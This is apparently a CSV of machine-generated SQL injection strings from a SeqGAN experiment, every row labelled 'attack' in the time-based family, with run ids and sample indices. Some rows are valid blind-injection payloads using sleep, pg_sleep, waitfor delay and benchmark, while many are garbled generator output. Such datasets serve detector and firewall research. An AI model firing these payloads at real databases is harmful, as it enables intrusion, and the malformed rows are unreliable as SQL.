label,payload,family,payload_type,method,run_id,sample_index
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,142
attack,"""  )    )    )    )    )    or pg_sleep  (  __TIME_________TIME_____TIME____TIMD5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,143
attack,"o, sleep__TIME_____TIME_____TIME______TIME__  )    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,144
attack,""" or sleep  (  __TIME__  )    =  ""    )    )    or when   (  select 4240 from pg_sleep  (  5000000,mmd((  select __TIME___  ),50__TIME______TIME______TIME_____TIME______TIME___  )     T)    )    =_    __TIME__,v  ,MD5  (  6272,sleep  (  (  substring   (    )    )    )    )    )    )    )    p1'    )    )    )    or ",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,145
attack,"1""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""cnelike 9862  (  )    )    )    )    =    6272  ___TIME__  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,146
attack,'  )    )    )    )    )    or sleep  (  __TIME_____TIME__  5   _  and 6969E__T--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,147
attack,",  )    )    )    or benchmark  (  5   )    )    )    )    )    and  =   )    )    elseor 8514  =    (  select elt  =  ''  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,148
attack,"' waitfor delay ',waitforor benchmark  (  ___TIME_____TIME____  )",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,149
attack,""" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,150
attack,1'  )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,151
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,152
attack,sleep  )  sleep  (  IME_  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,153
attack, sso '0:0:2' when    )    =_____TIME_  sleep  )    )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,154
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  ""tf.x""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,155
attack,1%   )    )    )    )    > or benchmark  (  5  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,156
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,157
attack,"$  )    or from pg_sleep  (  6272,sleep  (  5   select and * sleep  (  ___TIME__  sleep  (  5  )    3114,--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,158
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,159
attack,""" or pg_sleep  (  ___TIME______TIME_____T'   )    )        =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,160
attack,1'  )   waitfor delay '0:0:__TIME__'--,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,161
attack,1'  case 4240 when   (    (  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,162
attack,,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,163
attack,"""  )   waitfor delay (  benchmark  (  6272,sleep  (  ___TIMD5  ,MD5_  =  )    )    =   )    )    )    =  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,164
attack,1'  )   waitfor delay delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,165
attack,"1%""  )   rlike sleep  (  5  )   and   (  """"  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,166
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""ba""  =  ""bs vxic where 7260  s 1361  =  when   )    (  )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,167
attack, )    )    )    or benchmark  (  5  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,168
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""a where 2657 8036 8594  =  3114    =    )    )    )    )    )    )     )   or pg_sleep  (  (  3114,sleep  (  __TIME__TIME____TIME______TIME__  ),sleep  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,169
attack, and     (  =  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,170
attack,1 where 2840 7739 8781  =  __TIME_____)    )    =   )    )    =  sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,171
attack,"; or 2388  =    =   __TIME__)  )     ,25,1  )   <>  )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,172
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%zlx' where 6784  =  7260 4240 and * '0:0:10'=  Imd5  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,173
attack,1'  )    )    )    or sleep  (  __TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,174
attack,1    )    )    )    or 4240 9862 sleep  (  3114  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,175
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%8594qg if not  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,176
attack,1'    )    )    )    >ahwaitfor delay delay --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,177
attack,"""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,178
attack,sleep  ___  )    _  IME___  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,179
attack,  )   or   (    )    )    )    )    )    )    )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,180
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%0""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  """"  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  """" like ""m""  =  ""*za",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,181
attack,"1%""  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )   and   (  ""c where 6456 '0:0:__TIME__'--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,182
attack,1'   )    )    or 4240 delay 8514   6866 * from   )    )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,183
attack,"1%'   )    )    or elt  ____TIME__  )     ,d5  =  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,184
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%' wherel delay '0:0:__TIME__'-- 9443*  =    __TIME_____TIME___)  )and  )    --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,185
attack,1'  )    )    )    )    )    and sleep  (  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,186
attack,"""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,187
attack,"1""   )    )    )    and 4240 sleep  (  __)    )    =  10000000,,MD5  (  )    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,188
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,189
attack,"or sleep  (  5  )     ,25,mddo  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,190
attack, )    )    or pg_sleep  (  5  )    )    =  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,191
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%ifwcct",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,192
attack,"""   )    )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,193
attack,"1%""<> 8781 or 8594  =  sleep  (  ____TIME____TIME____TIME____TIME_____TIME__)    =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,194
attack,1'    )    )    )    )    or sleep  (  )  sdo  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,195
attack,sleep sleep  (  __TIME__  )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,196
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  )   rlike sleep  (  5  )   and   (  ""%' if",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,197
attack,1'1 where 6784l or   (  select * from   (  benchmark  )  --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,198
attack,"1%iwc""  =  ""x' where )    )    =    __TIME___  sleep  (  3114,sleep  (  5   )    )    )    )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,199
attack,"""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,200
attack,   )    )    )    --,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,201
attack,1   )    )    )    )    or 4240  =    I   )    )    benchmark    )    )    (    )    )    )    )        )     )    as dol b 4240ll where y  =  select  =  sleep  (  ___TIME_____TIME___  5   )    )    )    )    0x76555642   )    10    )    or' from sleep  (  9443  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,202
attack,"1"" where 7739  =  1361 benchmark  (  sleep  (  __TIME______TIME__TIME_____TIME____TIME______TIME______T'   )    (  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,203
attack,"1""  )   or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,204
attack,sleep  (  5   )    )    )    )    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,205
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,206
attack,* 4240 from e  )   )    or benchmark  (  __TIME__  )    )    )    =  ',time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,207
attack,"1%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,208
attack,"%""   )    )    or sleep(  5   )    )    )    )    ) pg_sleep  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,209
attack,1%'  )   or   )    (    )    )    )    )    )    )    )    )    _)    ')  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,210
attack,"1""  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and   (  ""bac where 3885  =      )    )    (    )    )    )    )    )    )    #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,211
attack,select 8514=  9443  (    (    )    )    )    )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,212
attack,"1%%""  )   rlike sleep  (  5  )   and   (  ""%bf",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,213
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,214
attack,"1'"" or sleep  (  0x4c4d6142   )    =    )    )    )    )    or @ sleep  (  )  --",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,215
attack," and e,,sleep 50  ______TI__TIME_____TIME______TIME___TIME_______TIMD5  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,216
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,217
attack,1%   )    )    )    or pg_sleep  (  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,218
attack,"1%""   )    )    )    and 9443* from * sleep  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,219
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%bf 'isintegratedsecurityonly'a,)    )    <> select 6784  =    )    )    (    )    __TIMD5(  )--",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,220
attack,"""  )   or sleep  (  __TIME__  )    =  "" or sleep  (  ___TIME_____TIME_____TIME_______TIME______TIME___TIME______TIME_____TIME___TIME______TIME_____TIME__  sleep  (  5   )    )    )    )       )    )    )    from",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,221
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%%""   )    )    or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,222
attack,"; or information_schema8466  =    (  select benchmark  (  )   )    =  sleep  9862  ),sleep  (  ,  (  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,223
attack,"1%""  )   rlike sleep  (  5  )   and   (  ""%""  =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,224
attack,""" or sleep  (  __TIME__  )    =  """,time,time,seqgan_improved,seqgan_improved__phase3__time__A__200__V8__sql_aware__len160__gpre160__reward_on__seed88,225
